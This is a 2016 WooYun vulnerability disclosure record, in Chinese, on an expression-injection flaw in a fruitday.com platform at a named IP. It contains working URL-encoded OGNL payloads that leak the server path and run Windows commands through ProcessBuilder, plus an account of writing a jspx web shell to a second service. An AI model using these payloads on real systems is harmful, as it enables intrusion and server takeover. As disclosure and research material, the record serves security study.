{"id": 87885, "wybug_id": "wooyun-2016-0219335", "wybug_title": "天天果园某平台表达式注入(已Getshell)                                      ", "wybug_corp": "fruitday.com", "wybug_author": "A1opex", "wybug_date": "2016-06-15 06:49", "wybug_open_date": "2016-06-20 07:40", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["表达式注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-06-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-15：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： \"Some of us don't get to grow old with the one we love.\" — \"I'll go old with her, Mr. Reese, just from afar.\" 某天，阳光明媚，乌云密布，睡了个午觉，梦见某ip存在表达式注入，醒来打开电脑，凭借零散的记忆，然后就Getshell了 详细说明：  http://180.167.72.216:89\n\n发现了一个表达式注入\n\npayload\n%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D\n爆出绝对路径尝试写shell然而failed，访问其他页面都需要登录想啊想，不能就这样放弃了呀nmap扫一下，发现88端口还有一个web服务\n\n巧的是如果关闭了弹窗的话会被重定向到一个帮助文件，这个是不需要登录的于是在89端口的表达式注入那里\n%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'cmd','/c','dir e:\\*.jsp /s'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println('~'%2B'~~2')%2C%23matt.getWriter().println(%23e)%2C%23matt.getWriter().println('2~'%2B'~~')%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D\n找到了88端口的这个web服务的物理路径写shell直接jsp肯定是不行的，然而jspx\n\n\n\n总的来说就是从A服务的命令执行写shell到B服务进行访问的故事   漏洞证明：  http://180.167.72.216:89\n\n发现了一个表达式注入\n\npayload\n%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D\n爆出绝对路径尝试写shell然而failed，访问其他页面都需要登录想啊想，不能就这样放弃了呀nmap扫一下，发现88端口还有一个web服务\n\n巧的是如果关闭了弹窗的话会被重定向到一个帮助文件，这个是不需要登录的于是在89端口的表达式注入那里\n%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'cmd','/c','dir e:\\*.jsp /s'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println('~'%2B'~~2')%2C%23matt.getWriter().println(%23e)%2C%23matt.getWriter().println('2~'%2B'~~')%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D\n找到了88端口的这个web服务的物理路径写shell直接jsp肯定是不行的，然而jspx\n\n\n\n总的来说就是从A服务的命令执行写shell到B服务进行访问的故事   修复方案：  你懂的比我多呐>3<   版权声明：转载请注明来源 A1opex@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-06-20 07:40 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-06-15 09:47 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:486 漏洞数:53        | 我有一个好想法！)\t\t \n  诗情画意    \n     2016-06-15 09:49 |    \t\tAno_Tom  \t\t\t( 普通白帽子  |\t\t\t        Rank:474 漏洞数:47        | Talk is cheap.:)\t\t \n  文艺女黑客    \n     2016-06-15 10:34 |    \t\t荒废的腰子 \t\t\t( 普通白帽子  |\t\t\t        Rank:264 漏洞数:31        | bug is my best friend)\t\t \n  老板喊你去审核插件...    \n     2016-06-15 10:38 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:840 漏洞数:115        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  警察叔叔，就是这个人！    \n     2016-06-15 12:49 |    \t\t重瞳 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 我是重瞳)\t\t \n  @荒废的腰子 .....    \n     2016-06-15 14:31 |    \t\tCodeMan \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 湖北荆州公安的)\t\t \n  \"Some of us don't get to grow old with the one we love.\"— \"I'll go old with her, Mr. Reese, just from afar.\" 某天，阳光明媚，乌云密布，睡了个午觉，梦见某ip存在表达式注入，醒来打开电脑，凭借零散的记忆，然后就Getshell了    \n     2016-06-16 10:49 |    \t\tA1opex \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:6        | 万物皆可print)\t\t \n  @荒废的腰子  TuT中场休息    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}